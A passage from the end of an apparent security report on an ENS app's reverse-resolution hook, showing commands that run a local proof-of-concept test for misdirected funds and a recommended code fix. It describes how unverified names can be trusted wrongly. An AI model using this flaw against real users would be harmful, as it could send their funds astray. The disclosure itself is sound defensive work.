POC_VICTIM_NAME=nick.eth    npx vitest run src/poc-misdirected-funds.test.tsx   ->  Tests 5 passed (5)
POC_VICTIM_NAME=sepolia.eth npx vitest run src/poc-misdirected-funds.test.tsx   ->  Tests 5 passed (5)
```

## Recommended Fix

Carry the bit through at `useReverseResolution.ts:241`:

```ts
const defaultName = defaultResult?.match ? defaultResult.name : null
```

Or drop `allowMismatch: true` at `:239`, after which ensjs returns `null` on a mismatch and every downstream consequence disappears. If the unverified name is wanted for the Default row's own display, which correctly shows `False`, keep it in a separate field that the inherit-default branch does not read.
